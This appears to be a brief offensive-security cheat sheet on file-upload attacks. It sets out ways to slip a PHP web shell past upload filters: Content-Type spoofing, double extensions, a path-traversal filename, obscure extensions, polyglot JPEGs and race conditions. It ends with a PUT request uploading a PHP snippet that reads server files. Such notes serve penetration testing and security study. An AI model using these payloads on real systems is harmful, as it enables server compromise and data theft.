# File upload

## Evasion

### Content-type
Content-Type: application/x-php
Content-Type: image/jpeg

### Filename
shell.jgp.php

Could try to save file to execute in another location with more privileges:
Content-Disposition: form-data; name="avatar"; filename="`%2e%2e%2f`shell.jgp.php"
%2e%2e%2f ->  ../

### Blacklisting
.php5, .shtml to evade blacklist use less known extensions

### Upload config file
Refer to apache.md and IIS.md
May be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

### Polyglot web shell upload
File contents: JPEG starts with FF D8 FF
ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
Can just send a .jpg, change the part from the file to include php code and change name to something.php

### Exploiting file upload race conditions
Some applications upload files to a sandbox directory with a randomized name and move them only after validation. Others first save the file to disk and delete it if it fails checks, often relying on antivirus scanning.

A similar issue occurs when uploading files via a URL: the server must first download and store the file locally before validation.

### Upload via PUT
PUT /images/exploit.php HTTP/1.1
<?php echo file_get_contents('/path/to/file'); ?>
